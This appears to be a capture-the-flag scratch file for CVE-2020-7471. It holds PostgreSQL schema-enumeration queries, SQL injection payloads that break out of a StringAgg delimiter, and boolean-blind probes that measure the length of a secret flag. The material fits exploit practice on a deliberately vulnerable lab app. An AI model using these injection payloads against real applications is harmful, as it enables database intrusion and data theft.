# CTF_CVE-2020-7471



## Query
---
```
/*
SELECT datname FROM pg_database;
select * from pg_tables;

select * from information_schema.tables;


select column_name,data_type 
from information_schema.columns 
where table_name = 'vul_blog';

SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '-') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 OR 1=2 GROUP BY "vul_blog"."title" LIMIT 2 offset 1 --') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 2

SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND 1=2 GROUP BY "vul_blog"."title" LIMIT 21

select flag, length(flag) from vul_flag where 1=1 AND if(length());

select case when length(select flag from vul_flag limit 1) < 10 then 'w' else '메롱' end;



select '1' as "wow", Exists (select flag from vul_flag);
select case when length(flag) > 10 then true else false end as tmp from vul_flag;



SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when length(title) > 10 then true else false end GROUP BY "vul_blog"."title" LIMIT 21


select title, string_agg('vul_flag', 'flag','') from vul_blog;

select (SELECT length(string_agg(vul_flag.flag, ''))FROM vul_flag);
*/
SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when (SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) > 12 then true else false end GROUP BY "vul_blog"."title" LIMIT 21

/*
'SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", \'-\') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 2 offset 1 -- \') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 21'
*/
```
